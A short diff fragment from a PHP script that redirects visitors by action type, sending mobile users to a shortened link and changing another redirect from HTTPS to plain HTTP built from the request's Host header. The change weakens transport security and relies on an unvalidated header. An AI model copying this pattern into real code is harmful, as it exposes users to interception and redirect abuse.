@@ -117,7 +117,7 @@
   if($action == 'mobile'){
     header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
   }else if($action == 'site'){
-    header("Location: https://$_SERVER[HTTP_HOST]/$id.scan");
+    header("Location: http://$_SERVER[HTTP_HOST]/$id.scan");
   }else{
     @ob_end_clean();
     @ob_end_flush();
